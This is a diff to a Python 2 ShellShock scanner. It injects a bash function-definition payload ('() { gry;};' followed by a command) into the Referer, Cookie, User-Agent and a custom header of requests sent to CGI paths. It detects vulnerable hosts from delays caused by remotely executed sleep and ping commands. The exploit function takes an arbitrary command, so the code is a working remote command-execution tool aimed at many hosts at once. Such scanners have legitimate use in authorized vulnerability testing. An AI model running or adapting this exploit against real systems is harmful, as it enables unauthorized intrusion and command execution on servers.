@@ -15,15 +15,19 @@ from threading import Thread
 from Queue import Queue
 
 SLEEP_TIME=9
-DELAY_TIME=5
+SLEEP_DELAY=5
+PING_PKTS=9
+PING_DELAY=7
+
 TIMEOUT=10
-ERRORS_TO_ABORT = 5
+ERRORS_TO_ABORT = 8
 protocol=''
 target_results = []
 concurrent = 20
+PERSOHEADER='test'
+USER_AGENT='ShellShock-Scanner - https://github.com/gry/shellshock-scanner/'
 
-def exploit(target_host, cgi_path, command):
-    # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)
+def request(target_host, path, headers):
     if protocol == 'http':
         conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
     elif protocol == 'https':
@@ -32,6 +36,17 @@ def exploit(target_host, cgi_path, command):
         conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
     else:
         conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
+    headers=headers
+    start = time.time()
+    conn.request("GET", path, headers=headers)
+    res = conn.getresponse()
+    end = time.time()
+    delay = end - start
+    # print >> sys.stderr, "%s:\t[%s]\t%s %s\t%s" %(target_host, command, res.status, res.reason, delay) 
+    return (res.status, res.reason, delay)
+    
+def exploit(target_host, cgi_path, command):
+    # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)
 
     shellcode="() { gry;};%s" % command
 
@@ -39,52 +54,77 @@ def exploit(target_host, cgi_path, command):
         "Referer": shellcode,
         "Cookie": shellcode,
         "User-Agent": shellcode,
-        "test": shellcode,
+        PERSOHEADER: shellcode,
         }
-    start = time.time()
-    conn.request("GET", cgi_path, headers=headers)
-    res = conn.getresponse()
-    end = time.time()
-    delay = end - start
-    # print >> sys.stderr, "%s:\t[%s]\t%s %s\t%s" %(target_host, command, res.status, res.reason, delay) 
-    return (res.status, res.reason, delay)
+    return request(target_host, cgi_path, headers)
 
-def testSleep(target_host, cgi_path):
+def testShellShock(target_host, cgi_path, command):
     try:
         status1 = reason1 = delay1 = status2 = reason2 = delay2 = None
-        command1 = "/bin/sleep 0"	#Yes I know.. but I was too lazy to do just a normal request
-        command2 = "/bin/sleep %s" % SLEEP_TIME
-        status1, reason1, delay1 = exploit(target_host, cgi_path, command1)
+        command2 = command
+        headers = {"Content-type": "application/x-www-form-urlencoded",
+            "User-Agent": USER_AGENT,
+            }
+        status1, reason1, delay1 = request(target_host, cgi_path, headers)
         status2, reason2, delay2 = exploit(target_host, cgi_path, command2)
-        warning = delay2 > SLEEP_TIME
-        vulnerable = warning and delay2-delay1>DELAY_TIME
-        if vulnerable: 
-            print "%s%s\t VULNERABLE" %(target_host, cgi_path)
-        print "%s%s - %s - %s" %(target_host, cgi_path, vulnerable, delay2)
+        # warning = delay2 > SLEEP_TIME
+        # vulnerable = warning and delay2-delay1>DELAY_TIME
         return {'host': target_host,
                 'cgi_path': cgi_path,
-                'requests': [(command1, status1,reason1,delay1), (command2,status2,reason2,delay2)],
-                'vulnerable' : vulnerable,
-                'warning' : warning,
+                'requests': [('normal request', status1,reason1,delay1), (command2,status2,reason2,delay2)],
+                # 'vulnerable' : vulnerable,
+                # 'warning' : warning,
+                'vulnerable' : None,
+                'warning' : None,
                 'error': False,
                 'delay_diff' : delay2-delay1
                 }
-    except:
+    except Exception as e:
         # Probably exception with the connection
         return {'host': target_host,
                 'cgi_path': cgi_path,
-                'requests': [(command1,status1,reason1,delay1), (command2,status2,reason2,delay2)],
+                'requests': [('normal request',status1,reason1,delay1), (command2,status2,reason2,delay2)],
                 'vulnerable' : False,
                 'warning' : False,
                 'error': True,
                 'delay_diff' : None
                 }
 
+
+def testSleep(target_host, cgi_path):
+    shellshocktest = testShellShock(target_host, cgi_path, "/bin/sleep %s" %SLEEP_TIME)
+    if not shellshocktest['error']:
+        shellshocktest['warning'] = shellshocktest['requests'][1][3] > SLEEP_TIME # Delay command request > sleep time
+        shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > SLEEP_DELAY
+        if shellshocktest['vulnerable']: 
+            print "%s%s\t VULNERABLE" %(target_host, cgi_path)
+        print "%s%s - %s - %s" %(target_host, cgi_path, shellshocktest['vulnerable'], shellshocktest['requests'][1][3])
+    return shellshocktest
+
+def testPing(target_host, cgi_path):
+    shellshocktest = testShellShock(target_host, cgi_path, "/bin/ping -c%s 127.0.0.1" %PING_PKTS)
+    if not shellshocktest['error']:
+        shellshocktest['warning'] = shellshocktest['requests'][1][3] > PING_DELAY # Delay command request > sleep time
+        shellshocktest['vulnerable'] = shellshocktest['warning'] and shellshocktest['delay_diff'] > PING_DELAY
+        if shellshocktest['vulnerable']: 
+            print "%s%s\t VULNERABLE" %(target_host, cgi_path)
+        print "%s%s - %s - %s" %(target_host, cgi_path, shellshocktest['vulnerable'], shellshocktest['requests'][1][3])
+    return shellshocktest
+
 def testCGIList(target_host, cgi_list):
     test_list = []
     errors = 0
     for cgi_path in cgi_list:
         cgitest = testSleep(target_host, cgi_path)
+        test_list.append(cgitest)
+        if cgitest['error'] is True:
+            errors +=1;
+        else:
+            errors = 0
+        if errors >= ERRORS_TO_ABORT:
+            print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
+            break;
+        cgitest = testPing(target_host, cgi_path)
         test_list.append(cgitest)
         if cgitest['error'] is True:
             errors +=1;
